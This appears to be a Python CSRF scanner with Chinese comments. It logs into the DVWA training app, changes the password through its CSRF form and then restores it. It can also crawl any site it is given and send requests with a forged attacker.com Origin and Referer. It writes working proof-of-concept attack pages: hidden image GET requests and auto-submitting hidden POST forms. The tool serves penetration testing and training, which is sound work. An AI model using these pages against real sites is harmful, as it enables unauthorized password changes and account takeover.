import os
import sys
import time
import json
import random
import string
from urllib.parse import urljoin, urlparse, urlencode
from typing import Dict, List, Optional, Any, Tuple
import requests
from bs4 import BeautifulSoup
from colorama import Fore, init
from datetime import datetime

try:
    from DVWAlogin import DvwaLogin
    from crawler import VulnerabilityCrawler

    print(f"{Fore.GREEN}[✓] 依赖模块加载成功")
except Exception as e:
    print(f"{Fore.RED}[✗] 依赖加载失败: {e}")
    sys.exit(1)

init(autoreset=True)


class DvwaCSRFScanner:
    def __init__(self, session, mode="dvwa", base_url=None, original_password="password"):
        self.session = session
        self.mode = mode
        self.base_url = base_url.rstrip('/') if base_url else None
        self.original_password = original_password
        self.current_password = original_password
        self.should_rollback = True
        self.force_rollback = False
        self.timeout = 10

        if mode == "dvwa":
            self.target_url = urljoin(self.base_url, "vulnerabilities/csrf/")
        else:
            self.target_url = None

        self.report_dir = os.path.join("scan_result", "DvwaCSRFScanner")
        os.makedirs(self.report_dir, exist_ok=True)

        self.results = {
            'target_url': None,
            'vulnerabilities': [],
            'scan_time': None,
            'forms_tested': 0,
            'csrf_points_found': 0
        }

    def cleanup(self):
        if self.should_rollback and self.current_password != self.original_password:
            print(f"\n{Fore.YELLOW}[*] 执行最终回滚...")
            self._rollback_password()
        elif not self.should_rollback:
            print(f"\n{Fore.GREEN}[*] 按用户选择，密码保持为: {self.current_password}")

    def _rollback_password(self, max_retries=5):
        if not self.session or not self.base_url:
            return False

        try:
            form = self.extract_csrf_form()
            if not form:
                print(f"{Fore.RED}[✗] 无法回滚：未找到密码修改表单")
                return False

            rollback_url = form['action']
            current_pass = self.current_password
            original_pass = self.original_password

            try:
                self.session.get(rollback_url, timeout=5)
            except:
                pass

            for attempt in range(1, max_retries + 1):
                try:
                    data = {
                        "password_current": current_pass,
                        "password_new": original_pass,
                        "password_conf": original_pass,
                        "Change": "Change"
                    }

                    ok, resp = self.send_request(
                        rollback_url,
                        method=form['method'],
                        **({'params': data} if form['method'] == 'GET' else {'data': data})
                    )

                    if not ok or not resp:
                        print(f"{Fore.YELLOW}[!] 回滚请求失败，第{attempt}次重试…")
                        time.sleep(1)
                        continue

                    text = resp.text.lower()
                    success_keywords = [
                        'password changed',
                        'password updated',
                        'password has been changed',
                        'successfully'
                    ]

                    if any(k in text for k in success_keywords):
                        print(f"{Fore.GREEN}[✓] 密码回滚成功：{original_pass}")
                        self.current_password = original_pass
                        return True

                    print(f"{Fore.YELLOW}[!] 第{attempt}次回滚失败，页面未返回成功提示")

                except Exception as e:
                    print(f"{Fore.YELLOW}[!] 回滚异常: {e}，重试中…")

                time.sleep(1)

            print(f"{Fore.RED}[✗] 回滚失败，请手动将密码恢复为：{original_pass}")
            return False

        except Exception as e:
            print(f"{Fore.RED}[✗] 回滚出现致命错误: {e}")
            return False

    def setup_session(self, dvwa_login_instance: DvwaLogin) -> bool:
        try:
            session_info = dvwa_login_instance.get_session_info()
            if not session_info or 'session' not in session_info:
                print(f"{Fore.RED}[✗] 会话信息无效")
                return False

            self.session = session_info['session']
            self.base_url = session_info['base_url']
            print(f"{Fore.GREEN}[✓] 会话设置: {self.base_url}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] 设置失败: {e}")
            return False

    def detect_dvwa_level(self) -> str:
        try:
            response = self.session.get(f"{self.base_url}/security.php", timeout=10)
            if 'low' in response.text:
                return 'low'
            elif 'medium' in response.text:
                return 'medium'
            elif 'high' in response.text:
                return 'high'
            return 'unknown'
        except:
            return 'unknown'

    def send_request(self, url: str, method: str = 'GET', data: Dict = None, params: Dict = None,
                     headers: Dict = None, json_data: Any = None) -> Tuple[bool, Optional[requests.Response]]:
        headers = headers or {}
        try:
            resp = self.session.request(
                method=method.upper(),
                url=url,
                params=params,
                data=data,
                json=json_data,
                headers=headers,
                timeout=self.timeout,
                verify=False
            )
            return True, resp
        except Exception as e:
            print(f"{Fore.RED}[✗] 请求失败: {e}")
            return False, None

    def extract_csrf_form(self) -> Dict[str, Any]:
        target_url = f"{self.base_url}/vulnerabilities/csrf/"
        success, response = self.send_request(target_url)
        if not success or not response:
            return {}

        soup = BeautifulSoup(response.text, 'html.parser')
        form = soup.find('form')
        if not form:
            return {}

        raw_action = form.get('action', '').strip()
        if raw_action in ['', '#']:
            action = target_url
        else:
            action = urljoin(target_url, raw_action)

        method = form.get('method', 'POST').upper()

        inputs = []
        for tag in form.find_all(['input', 'textarea', 'select', 'button']):
            name = tag.get('name')
            if name and 'token' not in name.lower() and 'csrf' not in name.lower():
                inputs.append(name)

        return {'action': action, 'method': method, 'inputs': inputs}

    def test_csrf_vulnerability(self, level: str) -> Dict[str, Any]:
        form = self.extract_csrf_form()
        if not form:
            return {'vulnerable': False, 'reason': '未找到CSRF表单'}

        new_pass = "baipi666"
        old_pass = self.current_password

        test_data = {
            'password_current': old_pass,
            'password_new': new_pass,
            'password_conf': new_pass,
            'Change': 'Change'
        }

        try:
            ok, resp = self.send_request(
                form['action'],
                method=form['method'],
                **({'params': test_data} if form['method'] == 'GET' else {'data': test_data})
            )

            if not ok or not resp:
                return {'vulnerable': False, 'reason': '请求失败'}

            success_keywords = [
                'password changed',
                'password updated',
                'password has been changed',
                'successfully'
            ]

            text = resp.text.lower()
            success = any(k in text for k in success_keywords)

            if success:
                self.current_password = new_pass

                vuln_info = {
                    'vulnerable': True,
                    'level': level,
                    'target_url': form['action'],
                    'method': form['method'],
                    'payload': test_data,
                    'risk_level': 'high',
                }

                filename = self.generate_poc_html(vuln_info)
                vuln_info['poc_file'] = filename

                return vuln_info

            return {'vulnerable': False, 'reason': '页面未返回成功提示'}

        except Exception as e:
            return {'vulnerable': False, 'reason': f'异常: {e}'}

    def generate_poc_html(self, vuln):
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        random_str = ''.join(random.choices(string.ascii_lowercase, k=6))
        filename = f"csrf_poc_{vuln['level']}_{timestamp}_{random_str}.html"
        abs_filename = os.path.join(self.report_dir, filename)

        attack_url = f"{vuln['target_url']}?{urlencode(vuln['payload'])}"

        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF POC - {vuln['level'].upper()}</title>
</head>
<body>
    <h2>CSRF POC - {vuln['level'].upper()}</h2>
    <img src="{attack_url}" style="display:none;">
    <p style="color:red;">CSRF 攻击已发送，请检查密码是否被修改！</p>
</body>
</html>"""

        with open(abs_filename, "w", encoding="utf-8") as f:
            f.write(html)

        return abs_filename

    def generate_report(self) -> Dict[str, Any]:
        return {
            'scan_summary': {
                'target_url': self.results['target_url'],
                'scan_time': self.results['scan_time'],
                'forms_tested': self.results['forms_tested'],
                'csrf_points_found': self.results['csrf_points_found'],
                'poc_files': [v.get('poc_file') for v in self.results['vulnerabilities']],
                'rollback_enabled': self.should_rollback,
                'report_dir': self.report_dir
            },
            'vulnerabilities': self.results['vulnerabilities'],
            'recommendations': [
                "实施CSRF Token（随机+单次有效）",
                "验证Referer/Origin头",
                "使用SameSite=Strict Cookie",
                "重要操作要求二次验证",
                "限制请求频率"
            ]
        }

    def print_report(self, report: Dict[str, Any]):
        summary = report['scan_summary']

        print(f"\n{Fore.YELLOW}{'=' * 70}")
        print(f"  {Fore.CYAN}DVWA CSRF扫描报告")
        print(f"{Fore.YELLOW}{'=' * 70}")
        print(f"{Fore.GREEN}等级: {self.detect_dvwa_level().upper()}")
        print(f"{Fore.GREEN}表单: {summary['forms_tested']}个")
        print(f"{Fore.GREEN}漏洞: {summary['csrf_points_found']}个")
        print(f"{Fore.YELLOW}回滚: {'已启用' if summary['rollback_enabled'] else '已禁用'}")
        print(f"{Fore.CYAN}报告目录: {summary['report_dir']}")
        print(f"{Fore.YELLOW}{'=' * 70}")

        if not report['vulnerabilities']:
            print(f"{Fore.GREEN}\n[✓] 未发现CSRF漏洞")
            return

        for vuln in report['vulnerabilities']:
            print(f"\n{Fore.RED}[!] CSRF漏洞验证成功！")
            print(f"{Fore.CYAN}方法: {vuln['method']}")
            print(f"{Fore.CYAN}目标: {vuln['target_url']}")
            print(f"{Fore.CYAN}新密码: baipi666")
            if vuln.get('bypass'):
                print(f"{Fore.MAGENTA}绕过: {vuln['bypass']}")
            print(f"{Fore.GREEN}[POC] {vuln['poc_file']}")

    def scan_dvwa_csrf(self) -> Dict[str, Any]:
        if not self.session or not self.base_url:
            print(f"{Fore.RED}[✗] 未初始化会话")
            return {}

        level = self.detect_dvwa_level()
        print(f"{Fore.GREEN}[*] DVWA安全等级: {level.upper()}")

        self.results['target_url'] = self.base_url
        self.results['scan_time'] = time.strftime('%Y-%m-%d %H:%M:%S')

        if self.force_rollback:
            print(f"\n{Fore.YELLOW}[*] 强制模式：自动回滚密码")
            self.should_rollback = True
        else:
            print(f"\n{Fore.YELLOW}[?] 由于现代浏览器默认SameSite=Lax，CSRF POC可能无效")
            print(f"{Fore.YELLOW}[?] 是否要在测试后回滚密码到原始值？")
            choice = input(f"{Fore.YELLOW}[?] 输入 'y' 回滚，输入 'n' 不回滚 (默认: y): ").strip().lower()
            self.should_rollback = choice != 'n'

        if self.should_rollback:
            print(f"{Fore.GREEN}[*] 已启用测试后回滚密码")
        else:
            print(f"\n{Fore.RED}[!] ===========================================")
            print(f"{Fore.RED}[!] 警告：您选择了不回滚密码！")
            print(f"{Fore.RED}[!] 密码已修改为: baipi666")
            print(f"{Fore.RED}[!] 后续扫描模块（SQL、XSS、命令注入等）将无法登录！")
            print(f"{Fore.RED}[!] 必须手动将密码改回 'password' 才能继续")
            print(f"{Fore.YELLOW}[!] 操作步骤：")
            print(f"{Fore.YELLOW}[!] 1. 使用 'baipi666' 登录 DVWA")
            print(f"{Fore.YELLOW}[!] 2. 进入 CSRF 漏洞页面")
            print(f"{Fore.YELLOW}[!] 3. 将密码改回 'password'")
            print(f"{Fore.RED}[!] ===========================================")

        print(f"\n{Fore.YELLOW}[扫描目标: {self.base_url}/vulnerabilities/csrf/]")

        vuln_result = self.test_csrf_vulnerability(level)

        if vuln_result.get('vulnerable'):
            self.results['vulnerabilities'].append(vuln_result)
            self.results['csrf_points_found'] = 1
            self.results['forms_tested'] = 1

            if self.should_rollback:
                print(f"\n{Fore.CYAN}[*] 正在回滚密码...")
                self._rollback_password()

        return self.generate_report()

    def try_auto_csrf_validation(self, form_info: Dict) -> Dict:
        """
        自动 CSRF 验证（不依赖人工）
        核心思想：
         构造一次普通请求
         构造一次“跨站”请求（伪造 Origin / Referer）
         如果服务端都接受 → 高可信 CSRF 漏洞
        """
        url = form_info['url']
        method = form_info['method'].upper()
        data = form_info.get("form_data", {})

        headers_normal = {
            "User-Agent": "Mozilla/5.0"
        }

        headers_cross = {
            "User-Agent": "Mozilla/5.0",
            "Origin": "http://attacker.com",
            "Referer": "http://attacker.com/poc.html"
        }

        try:
            session = getattr(self, "session", None) or requests

            r1 = session.request(method, url, data=data, headers=headers_normal, timeout=8)
            r2 = session.request(method, url, data=data, headers=headers_cross, timeout=8)

            # 如果登录失效 → 无法自动验证
            if r1.status_code in (401, 403) or "login" in r1.url.lower():
                return {"auto_validated": False, "reason": "需要登录，无法自动验证"}

            # 服务端拒绝跨站 → 安全
            if r2.status_code in (401, 403):
                return {"auto_validated": False, "reason": "服务器拒绝跨站请求"}

            # 若两次结果都 200 且相似，则认为**高可信 CSRF 漏洞**
            if r1.status_code == 200 and r2.status_code == 200:
                if abs(len(r1.text) - len(r2.text)) < 1000:
                    return {
                        "auto_validated": True,
                        "confirmed": True,
                        "evidence": "目标接口未校验 Origin/Referer，跨站请求被接受"
                    }

            return {"auto_validated": False, "reason": "无法确认是否真正被利用"}

        except Exception as e:
            return {"auto_validated": False, "reason": f"请求失败：{e}"}

    def assess_csrf_risk(self, form_info: Dict) -> Dict[str, Any]:
        """
        CSRF 风险评估（通用模式）
        返回：风险等级 + 评分 + 原因
        """
        score = 0
        reasons = []

        url = form_info['url']
        method = form_info.get('method', 'POST').upper()
        fields = list(form_info.get('form_data', {}).keys())

        path = urlparse(url).path.lower()

        # 敏感路径
        if any(k in path for k in ['password', 'delete', 'remove', 'update', 'edit']):
            score += 3
            reasons.append("敏感操作路径")

        # 敏感字段
        for f in fields:
            if any(k in f.lower() for k in ['pass', 'pwd', 'email', 'role']):
                score += 2
                reasons.append(f"敏感字段: {f}")
                break

        # CSRF Token 检测
        token_fields = ['csrf', 'token', 'nonce', '_token']
        has_token = any(any(t in f.lower() for t in token_fields) for f in fields)
        if has_token:
            score -= 3
            reasons.append("检测到 CSRF Token")
        else:
            score += 3
            reasons.append("未检测到 CSRF Token")

        # GET 请求 → 稍高风险
        if method == 'GET':
            score += 1
            reasons.append("使用 GET 提交")

        # 非登录接口
        if not any(k in path for k in ['login', 'signin']):
            score += 1

        # 风险等级
        if score >= 7:
            level = "HIGH"
        elif score >= 4:
            level = "MEDIUM"
        else:
            level = "LOW"

        return {
            "url": url,
            "method": method,
            "fields": fields,
            "risk_score": score,
            "risk_level": level,
            "reasons": list(set(reasons))
        }

    def detect_generic(self, crawl_results: Dict[str, Any]):
        print(f"\n{Fore.CYAN}{'=' * 60}")
        print(f"{Fore.CYAN}通用网站 CSRF 自动 + 半自动检测")
        print(f"{Fore.CYAN}{'=' * 60}")

        forms = crawl_results.get("forms", [])
        if not forms:
            print(f"{Fore.YELLOW}[!] 未发现任何表单，无法检测 CSRF")
            return

        # ======= 去重逻辑：避免重复检测 =======
        unique = {}
        for f in forms:
            url = f.get("url", "")
            method = f.get("method", "POST").upper()
            fields = tuple(sorted(f.get("form_data", {}).keys()))
            key = (url, method, fields)
            if key not in unique:
                unique[key] = f

        forms = list(unique.values())
        print(f"{Fore.CYAN}[i] CSRF 检测表单数量（去重后）: {len(forms)}")

        results = []

        for form in forms:
            # ================= 风险评估 =================
            risk = self.assess_csrf_risk(form)

            print(f"\n{Fore.WHITE}检测表单: {risk['url']}")
            print(
                f"方法: {risk['method']}  字段: {risk['fields']}  风险评分: {risk['risk_score']} ({risk['risk_level']})")

            # 仅对中高风险尝试自动验证
            if risk["risk_level"] in ("HIGH", "MEDIUM"):

                # ================= 自动验证 =================
                auto = self.try_auto_csrf_validation(form)

                if auto.get("auto_validated") and auto.get("confirmed"):
                    print(f"{Fore.RED}[✓] 自动确认存在 CSRF 漏洞！")
                    print(f"{Fore.RED}证据: {auto['evidence']}")

                    risk["verification"] = "confirmed"
                    risk["auto_reason"] = auto["evidence"]
                    results.append(risk)
                    continue

                # 自动验证失败 —— 输出原因 + SameSite 提示
                reason = auto.get("reason", "未知原因")
                print(f"{Fore.YELLOW}[~] 无法自动确认: {reason}")
                print(f"{Fore.BLUE}[i] 说明: 真实网站通常启用 SameSite Cookie、"
                      f"Origin/Referer 校验或仅接受同源请求，这可能导致跨站 POST 被浏览器拦截，"
                      f"从而无法通过脚本直接验证。")

            # ================= 半自动（生成 POC） =================
            poc = self.generate_csrf_poc(form)
            print(f"{Fore.CYAN}[+] 已生成 CSRF POC，请人工验证: {poc}")

            risk["verification"] = "need_manual_verify"
            risk["poc_file"] = poc
            results.append(risk)

        # ================= 保存报告 =================
        self.save_generic_report(results)

    def generate_csrf_poc(self, form: Dict) -> str:
        """
        兼容 detect_generic 调用
        """
        target_url = form["url"]
        method = form.get("method", "POST").upper()
        form_data = form.get("form_data", {})

        return self.generate_poc(target_url, form_data, method, mode="generic")

    def _test_csrf_manual(self, victim_session, form: Dict) -> Dict:
        target_url = form['url']
        method = form.get('method', 'POST').upper()

        test_data = self._generate_test_payload(form.get('form_data', {}))
        poc_file = self.generate_poc(target_url, test_data, method, mode="generic")

        print(f"\n{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.YELLOW}测试步骤")
        print(f"{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.CYAN}1. 在浏览器中登录目标网站（保持登录状态）")
        print(f"{Fore.CYAN}2. 在同浏览器的**新标签页**打开: file://{poc_file}")
        print(f"{Fore.CYAN}3. 观察页面是否显示'CSRF攻击已执行'")
        print(f"{Fore.CYAN}4. 手动检查目标网站数据是否被修改")
        print(f"{Fore.YELLOW}{'=' * 60}")
        print(f"{Fore.MAGENTA}[!] 请手动确认后，在报告中记录结果")

        return {
            "url": target_url,
            "method": method,
            "vulnerable": None,
            "poc_file": poc_file,
            "message": "需手动验证CSRF POC有效性",
            "test_data": test_data
        }

    def _generate_test_payload(self, form_data: Dict) -> Dict:
        payload = {}
        for key, value in form_data.items():
            if isinstance(value, str):
                if 'password' in key.lower():
                    payload[key] = 'TestCSRF123!'
                elif 'email' in key.lower():
                    payload[key] = 'csrf_test_' + str(random.randint(1000, 9999)) + '@example.com'
                elif 'username' in key.lower() or 'name' in key.lower():
                    payload[key] = 'csrf_user_' + ''.join(random.choices(string.ascii_lowercase, k=4))
                else:
                    payload[key] = str(value) + '_csrf_test'
            else:
                payload[key] = value
        return payload

    def generate_poc(self, target_url: str, form_data: Dict, method: str, mode="dvwa") -> str:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        random_str = ''.join(random.choices(string.ascii_lowercase, k=6))

        if mode == "dvwa":
            filename = f"csrf_poc_{mode}_{timestamp}_{random_str}.html"
        else:
            parsed = urlparse(target_url)
            path_name = parsed.path.replace('/', '_').strip('_')[:20]
            filename = f"csrf_poc_generic_{path_name}_{timestamp}_{random_str}.html"

        poc_path = os.path.join(self.report_dir, filename)

        if method == 'GET':
            query_string = urlencode(form_data)
            attack_url = f"{target_url}?{query_string}"
            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF POC - GET请求</title>
</head>
<body>
    <h2>CSRF POC - GET请求</h2>
    <p>目标: {target_url}</p>
    <img src="{attack_url}" width="1" height="1" style="display:none;">
    <p style="color:red; font-weight:bold;">CSRF攻击已执行！请检查目标网站数据是否被修改。</p>
</body>
</html>"""
        else:
            form_fields = "\n".join([
                f'<input type="hidden" name="{k}" value="{v}">'
                for k, v in form_data.items()
            ])

            html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CSRF POC - POST请求</title>
</head>
<body>
    <h2>CSRF POC - POST请求</h2>
    <p>目标: {target_url}</p>
    <form id="csrfForm" action="{target_url}" method="POST">
        {form_fields}
    </form>
    <script>document.getElementById("csrfForm").submit();</script>
    <p style="color:red; font-weight:bold;">CSRF攻击已执行！请检查目标网站数据是否被修改。</p>
</body>
</html>"""

        with open(poc_path, "w", encoding="utf-8") as f:
            f.write(html)

        return poc_path

    def save_generic_report(self, results: List[Dict]):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

        confirmed = sum(1 for r in results if r.get("verification") == "confirmed")
        need_manual = sum(1 for r in results if r.get("verification") == "need_manual_verify")

        high = sum(1 for r in results if r.get("risk_level") == "HIGH")
        medium = sum(1 for r in results if r.get("risk_level") == "MEDIUM")
        low = sum(1 for r in results if r.get("risk_level") == "LOW")

        report = {
            "mode": "generic-auto+manual",
            "target_base": self.base_url,
            "scan_time": timestamp,

            "summary": {
                "total_forms": len(results),
                "confirmed_vulnerable": confirmed,
                "need_manual_verify": need_manual,
                "risk_distribution": {
                    "HIGH": high,
                    "MEDIUM": medium,
                    "LOW": low
                }
            },

            "results": results,

            "notes": (
                "本报告基于自动验证 + 半自动验证模型：\n"
                "verification = confirmed：表示工具已自动确认目标接口可被跨站请求接受，"
                "且未发现有效 CSRF 防护，具有较高可信度，通常可视为真实 CSRF 漏洞；\n"
                "verification = need_manual_verify：表示存在较高/中等风险，但无法完全自动确认，"
                "已生成 POC 文件，请人工在登录状态下访问 POC 并确认服务器状态是否真的发生变化；\n"
                "注意：CSRF 最终认定标准以“是否成功跨站修改服务器状态”为准。"
            )
        }

        filename = f"csrf_report_generic_{timestamp}.json"
        report_path = os.path.join(self.report_dir, filename)

        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=4, ensure_ascii=False)

        print(f"\n{Fore.GREEN}[✓] 通用模式报告已保存: {report_path}")


def main():
    print("=" * 60)
    print("    CSRF漏洞扫描程序")
    print("=" * 60)

    print("\n选择目标类型:")
    print("1. DVWA (固定路径)")
    print("2. 其他网站 (生成POC后手动验证)")

    choice = input("\n请输入选项 (1/2): ").strip()

    if choice == "1":
        url = input("请输入 DVWA 首页 URL: ").strip()
        if not url:
            print(f"{Fore.RED}[✗] URL 不能为空")
            return

        print(f"{Fore.CYAN}[i] 正在登录 DVWA...")
        dvwa = DvwaLogin()
        if not dvwa.login(url):
            print(f"{Fore.RED}[✗] DVWA 登录失败")
            return

        print(f"{Fore.GREEN}[✓] DVWA 登录成功")
        dvwa.test_connection()

        session_info = dvwa.get_session_info()

        scanner = DvwaCSRFScanner(
            session_info['session'],
            mode="dvwa",
            base_url=session_info['base_url'],
            original_password="password"
        )

        try:
            report = scanner.scan_dvwa_csrf()
            scanner.print_report(report)

            if scanner.should_rollback:
                print(f"\n{Fore.YELLOW}[*] 验证回滚结果...")
                test_login = DvwaLogin()
                if test_login.login(url):
                    print(f"{Fore.GREEN}[✓] 验证成功：密码已回滚到 password")
                else:
                    print(f"{Fore.RED}[✗] 验证失败：密码未正确回滚！")

            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            report_path = os.path.join(scanner.report_dir, f"dvwa_csrf_report_{timestamp}.json")
            with open(report_path, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            print(f"\n{Fore.GREEN}[✓] 报告已保存: {report_path}")

        finally:
            scanner.cleanup()

    elif choice == "2":
        url = input("请输入目标网站 URL: ").strip()
        depth_input = input("请输入爬取深度 (默认2): ").strip()
        crawl_depth = int(depth_input) if depth_input.isdigit() else 2

        print(f"\n{Fore.CYAN}[i] 正在爬取网站...")
        crawler = VulnerabilityCrawler(url, max_depth=crawl_depth)
        crawler.crawl(url)
        crawl_results = crawler.get_results()

        print(f"{Fore.GREEN}[✓] 爬取完成，发现 {len(crawl_results.get('forms', []))} 个表单")

        scanner = DvwaCSRFScanner(None, mode="generic", base_url=url)
        scanner.detect_generic(crawl_results)

    else:
        print(f"{Fore.RED}[✗] 无效选项")


if __name__ == "__main__":
    main()